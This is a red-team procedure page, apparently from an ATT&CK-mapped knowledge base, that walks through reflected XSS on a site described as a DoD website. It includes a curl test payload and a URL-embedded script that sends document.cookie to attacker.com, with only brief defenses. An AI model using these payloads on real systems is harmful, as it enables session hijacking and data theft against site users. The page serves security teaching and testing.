---
id: proc-xss-url-injection
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.431Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Demonstrating XSS via Malicious URL

## Summary

This procedure crafts and delivers a malicious URL to exploit a cross-site scripting (XSS) vulnerability on a web application, such as the identified DoD website, allowing execution of arbitrary JavaScript in the user's browser to steal session data or alter content.

## Description

In this attack scenario, an attacker targets a web parameter (e.g., a search query) that fails to sanitize user input, enabling reflected XSS. By encoding a JavaScript payload in the URL, the attacker tricks victims into visiting the link, leading to script execution in their browser context. On a DoD site, this could expose sensitive session tokens or manipulate displayed information. Prerequisites include access to a vulnerable public-facing web app and basic knowledge of JavaScript payloads. Expected outcomes: Proof-of-concept execution confirming the vulnerability, with potential for data exfiltration to an attacker-controlled server.

## Requirements

1. Public access to the target website (e.g., DoD domain)
2. A web browser or command-line tool like curl for testing
3. Attacker-controlled domain for exfiltration (optional for PoC)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML-escape user inputs)
- Deploy Content Security Policy (CSP) headers to restrict script execution
- Monitor for anomalous JavaScript execution or unexpected outbound requests from browsers

## Objectives

1. Inject and execute malicious JavaScript in the victim's browser
2. Exfiltrate session cookies or other sensitive data
3. Demonstrate potential for content manipulation on the target site

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Scan the target website for input fields or URL parameters that reflect user input without sanitization, such as search boxes.

No specific command needed; use browser developer tools to inspect reflected inputs.

### Step 2: Craft Malicious Payload

**Context**: Create a simple JavaScript payload to test execution, escalating to data theft if successful.

Use [[commands/curl-xss-test]] to send a test payload:

```bash
curl -G "https://dod-website.example.com/search" --data-urlencode "q=<script>alert('XSS')</script>"
```

> This command sends a GET request with the encoded payload. If vulnerable, the response will include the raw script, which executes when loaded in a browser.

### Step 3: Deliver and Verify Exploitation

**Context**: Simulate victim interaction by loading the URL in a browser or proxy it through Burp Suite for observation.

Construct the full URL: `https://dod-website.example.com/search?q=<script>fetch('http://attacker.com/log?data='+encodeURIComponent(document.cookie))</script>`.

Load it in a browser and check the attacker's server logs for exfiltrated cookies.

> Expected output: Alert box appears, or network tab shows request to attacker domain with cookie data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test]]

## Tools Used


## Tags

- [[xss]]
- [[web-injection]]
